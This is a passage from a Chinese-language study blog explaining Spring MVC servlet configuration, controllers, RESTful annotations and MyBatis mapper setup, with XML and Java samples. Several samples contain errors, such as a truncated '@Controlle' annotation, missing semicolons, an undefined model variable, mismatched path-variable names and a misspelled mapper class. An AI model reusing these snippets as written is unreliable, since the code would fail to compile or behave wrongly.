<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>servlet_name<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="title">servlet-class</span></span><br><span class="line">        &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="title">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>servlet_name<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>/example/*<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>即配置<em>/example/**下的所有请求都被名叫</em>servlet_name<em>的servlet处理(具体配置文件为</em>/WEB-INF/servlet_name-servlet.xml*)</p>
<p>当然也有用java配置类的方法,只需要继承<em>org.springframework.web</em>下的<em>WebApplicationInitializer</em>接口即可<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyWebApplicationInitializer</span> <span class="keyword">implements</span> <span class="title">WebApplicationInitializer</span> </span>&#123;</span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(ServletContext container)</span> </span>&#123;</span><br><span class="line">        ServletRegistration.Dynamic registration = container.addServlet(<span class="string">"servlet_name"</span>,</span><br><span class="line">        <span class="keyword">new</span> DispatcherServlet());</span><br><span class="line">        registration.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        registration.addMapping(<span class="string">"/example/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="仅有单个Servlet的配置(特殊)">仅有单个Servlet的配置(特殊)</h3><ul>
<li>仅需要配置<em>applicationContext.xml</em></li>
</ul>
<p>如果仅有一个Servlet,那么可以将将所有请求拦截,然后交由Spring的<em>ApplicationContext</em>(或者说<em>Root</em>的<em>WebApplicationContext</em>)处理.</p>
<p>在web.xml下进行如下配置<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">web-app</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 可以折么修改applicationContext.xml的名字 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;/WEB-INF/root-context.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/context-param&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="title">servlet-class</span></span><br><span class="line">        &gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 也可以这么修改applicationContext.xml的名字 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="title">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="title">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>btw: 除了<em>ContextLoaderListener</em>,还有<em>ContextLoaderServlet</em>的实现</p>
<h2 id="SpringMVC的Controller">SpringMVC的Controller</h2><h3 id="基于注解的配置-1">基于注解的配置</h3><p><em>IndexController.java</em>(在<em>com.test</em>)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Controller</span> <span class="comment">// 类似于@Component但是是由springmvc解析</span></span><br><span class="line"><span class="annotation">@RequestMapping</span>(<span class="string">"/"</span>) <span class="comment">//指定此Controller绑定到 '/'路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@RequestMapping</span>(method = RequestMethod.GET)<span class="comment">//指定此函数方法绑定的是get方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>, <span class="string">"Spring MVC XML Config Example"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;<span class="comment">//使用了(@Response)Mapping而不是(@Response)Body所以去寻找index的view</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>index.jsp</em>(在<em>/WEB-INF/views/</em>下)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">p</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>servlet_name-servlet.xml</em></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 拦截所有请求时,需要此配置来使@Controller获得比&lt;mvc:default-servlet-handler/&gt; 更高的优先级 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 默认处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;context:annotation-config/&gt; 见上面Spring部分 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:component-scan</span> <span class="attribute">base-package</span>=<span class="value">"com.test"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 视图解析器,为返回的字符串添加前缀与后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"viewClass"</span> <span class="attribute">value</span>=<span class="value">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"prefix"</span> <span class="attribute">value</span>=<span class="value">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"suffix"</span> <span class="attribute">value</span>=<span class="value">".jsp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时访问<em><a href="http://localhost:8080/example/" target="_blank" rel="external">http://localhost:8080/example/</a></em>即可看到由<em>IndexController</em>传递<em>message</em>给<em>/WEB-INF/views/index.jsp</em>并显示的页面 </p>
<ul>
<li><em>Controller</em>中的<em>model</em>的区别</li>
</ul>
<table>
<thead>
<tr>
<th>Model</th>
<th>特点</th>
<th>使用</th>
<th>返回</th>
</tr>
</thead>
<tbody>
<tr>
<td>ModelMap</td>
<td>由Spring自动创建</td>
<td>作为函数方法的参数接受,并使用<em>addAttribute</em>传递参数</td>
<td>返回<em>String</em></td>
</tr>
<tr>
<td>ModelAndView</td>
<td>自己手动创建</td>
<td>使用<em>new</em>来创建,并使用<em>addObject</em>传递参数</td>
<td>返回<em>Model</em></td>
</tr>
</tbody>
</table>
<ul>
<li>返回字符串的关键字</li>
</ul>
<table>
<thead>
<tr>
<th>String</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>forward:</td>
<td>服务器转发</td>
</tr>
<tr>
<td>redirect:</td>
<td>客户端转发</td>
</tr>
</tbody>
</table>
<h3 id="基于xml的配置-1">基于xml的配置</h3><p>java继承并重写<em>Controller(org.springframework.web.servlet.mvc)</em>的<em>handleRequest</em>函数即可<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">implements</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleRequest</span><span class="params">(HttpServletRequest req, </span><br><span class="line">                                            HttpServletResponse res)</span> </span><br><span class="line">                                                     <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p><em>index.jsp</em>不变</p>
<p><em>servlet_name-servlet.xml</em><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 因为id不能包括'/' --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 而DispatcherServlet注册的BeanNameUrlHandlerMapping需要以'/'开头 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 所以只能设置为name别名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">name</span>=<span class="value">"/"</span> <span class="attribute">class</span>=<span class="value">"com.test.IndexController"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 视图解析器,为返回的字符串添加前缀与后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"viewClass"</span> <span class="attribute">value</span>=<span class="value">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"prefix"</span> <span class="attribute">value</span>=<span class="value">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"suffix"</span> <span class="attribute">value</span>=<span class="value">".jsp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="基于java配置类的配置-1">基于java配置类的配置</h3><p>参见Srping部分</p>
<p>即是<em>@Configuration</em> ,<em>@ComponentScan</em> 和<em>@Bean</em> 等的使用</p>
<h2 id="RESTFul">RESTFul</h2><p><em>RESTFul</em>,即符合REST(Representational State Transfer) principles的系統,通常用来做<em>api</em>,使用<em>json</em>(大多数)或<em>xml</em>通过<em>http</em>的方法来传递参数</p>
<p>我的理解即是视任何东西为对象,用各种http方法(<em>PUT</em>,<em>GET</em>,<em>DELETE</em>,<em>PATCH</em>等)来标识作用,真正要用的时候查查<a href="https://developer.github.com/v3/" target="_blank" rel="external">github的Api</a>看看怎么写的照猫画虎就OK 😂</p>
<p>SpringMVC中使用<em>@RequestMapping</em>,<em>@PathVariable</em>,<em>@RequestBody</em>和<em>@ResponseBody</em>来方便的实现<em>RESTFul</em></p>
<table>
<thead>
<tr>
<th>注解</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>@RequestMapping</em></td>
<td>绑定<em>Controller</em>到指定路径(api的)</td>
</tr>
<tr>
<td><em>@PathVariable</em></td>
<td>标识路径中的变量与函数方法参数的关系</td>
</tr>
<tr>
<td><em>@RequestBody</em></td>
<td>用来获取传入的数据(<em>json</em>/<em>xml</em>)</td>
</tr>
<tr>
<td><em>@ResponseBody</em></td>
<td>用来直接返回数据而不是调用<em>model</em></td>
</tr>
</tbody>
</table>
<ul>
<li>Example:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Controlle</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@RequestMapping</span>(value=<span class="string">"/postJson"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(@RequestBody Id_And_Name ian)</span></span>&#123;</span><br><span class="line">        StringBuffer sb=<span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">        sb.append(ian.id);</span><br><span class="line">        sb.append(<span class="string">"----&gt;"</span>);</span><br><span class="line">        sb.append(ian.name)</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>, sb.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@RequestMapping</span>(value=<span class="string">"/getJson/&#123;id&#125;"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="keyword">public</span> <span class="annotation">@ResponseBody</span> <span class="function">Id_And_Name <span class="title">index</span><span class="params">(@PathVariable <span class="keyword">int</span> uid)</span></span>&#123;</span><br><span class="line">        Id_And_Name ian=<span class="keyword">new</span> Id_And_Name().get_name_by_id(uid)</span><br><span class="line">        <span class="keyword">return</span> ian;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>btw: RPC就是使用二进制,而不是http,实现不同系统间相互通信</p>
<h1 id="Mybatis">Mybatis</h1><p>Mybatis(ibatis)</p>
<p>他通过<em>SqlSession</em>(由<em>SqlSessionFactory</em>创建)来执行(<em>Excutor()</em>)各种操作</p>
<p>我个人感觉折腾这个比折腾<em>hibernate</em>麻烦(当然是在使用<em>Intellij IDEA</em>的情况下)</p>
<h2 id="Mybatis配置"><em>Mybatis</em>配置</h2><h3 id="配置环境">配置环境</h3><ul>
<li><p>通过<em>mybatis-config.xml</em>来进行配置坏境</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入.properties文件,使得可以在下面的配置中引用 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- db.properties文件中有jdbc.password=toor等 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">properties</span> <span class="attribute">resource</span>=<span class="value">"db.properties"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">environments</span> <span class="attribute">default</span>=<span class="value">"development"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">environment</span> <span class="attribute">id</span>=<span class="value">"development"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 采用jdbc的事务管理 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">transactionManager</span> <span class="attribute">type</span>=<span class="value">"JDBC"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">dataSource</span> <span class="attribute">type</span>=<span class="value">"POOLED"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"driver"</span> <span class="attribute">value</span>=<span class="value">"com.mysql.jdbc.Driver"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"url"</span> <span class="attribute">value</span>=<span class="value">"jdbc:mysql://localhost:3306/test"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"username"</span> <span class="attribute">value</span>=<span class="value">"root"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"password"</span> <span class="attribute">value</span>=<span class="value">$&#123;jdbc.password&#125;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>  选择的数据表每条数据包含<em>id</em>,<em>username</em>,<em>password</em>内容</p>
<p>  实体类<em>User</em>(<em>com.test.entity</em>)</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    String username;</span><br><span class="line">    String password;</span><br><span class="line">    <span class="comment">// set,get方法略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="配置数据库方法">配置数据库方法</h3><ul>
<li><p>仅使用xml文件配置</p>
<ul>
<li><p><em>mybatis-config.xml</em></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用具体的mapper文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">resource</span>=<span class="value">"com/test/mapper/UserMapper.xml"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>被引用的<em>UserMapper.xml</em>文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- namespace的值习惯上设置成包名+sql映射文件名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"com.test.mapper.UserMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectUserById"</span> <span class="attribute">parameterType</span>=<span class="value">"int"</span> <span class="attribute">resultType</span>=<span class="value">"user"</span>&gt;</span></span><br><span class="line">        select * from user where id=#&#123;id&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"name !=null"</span>&gt;</span></span><br><span class="line">            and name=#&#123;name&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="title">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectUserListByName"</span> <span class="attribute">parameterType</span>=<span class="value">"string"</span> <span class="attribute">resultType</span>=<span class="value">"user"</span>&gt;</span></span><br><span class="line">        select * from user where username=#&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="title">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"saveUser"</span> <span class="attribute">parameterType</span>=<span class="value">"user"</span>&gt;</span></span><br><span class="line">        insert into user values(#&#123;username&#125;,#&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">delete</span> <span class="attribute">id</span>=<span class="value">"deleteUserById"</span> <span class="attribute">parameterType</span>=<span class="value">"int"</span>&gt;</span></span><br><span class="line">        delete from user where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="title">delete</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">update</span> <span class="attribute">id</span>=<span class="value">"udpateUserById"</span> <span class="attribute">parameterType</span>=<span class="value">"user"</span>&gt;</span></span><br><span class="line">        update user set username=#&#123;username&#125; where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="title">update</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>或者使用Mapper代理方式(写个接口)的方式配置</p>
<ul>
<li><p>UserMapper.java </p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">selectUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <em>mybatis-config.xml</em>与<em>UserMapper.xml</em>文件不变</p>
<ol>
<li><p><em>UserMapper.xml</em>中的<em>namespace</em>等于<em>mapper接口</em>地址</p>
</li>
<li><p>接口中的函数方法名与xml中的statemen的id一致</p>
</li>
<li><p>输入输出的类型要一致</p>
</li>
</ol>
</li>
</ul>
</li>
<li><p>或者直接在Mapper接口上进行注解</p>
<ul>
<li><p>UserMapper.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="annotation">@select</span>(<span class="string">"select * from user where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">selectUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    <span class="annotation">@Delete</span>(<span class="string">"delete from user where id=#&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteUserById</span><span class="params">(@Param(<span class="string">"id"</span>)</span> <span class="keyword">int</span> uid)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>UserMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用mapper的class --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">class</span>=<span class="value">"com.test.mapper.UserMappe"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>另外,使用<em>typeAliases</em>可设置别名从而精简书写量</p>
